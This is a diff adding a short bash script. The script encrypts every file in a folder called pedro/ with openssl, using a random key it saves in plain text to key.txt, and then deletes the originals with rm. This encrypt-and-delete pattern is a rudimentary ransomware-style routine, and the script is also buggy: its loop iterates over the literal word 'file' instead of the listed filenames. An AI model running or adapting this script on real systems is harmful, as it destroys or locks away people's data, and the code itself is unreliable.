@@ -1,0 +1,13 @@
+#!/bin/bash
+
+file=$(ls pedro/)
+
+key=$(uuidgen)
+
+echo $key > key.txt
+
+for z in file
+  do
+    openssl enc -aes256 -k $key -a -e -in pedro/$z -out pedro/$z".enc"
+    rm pedro/$z
+done
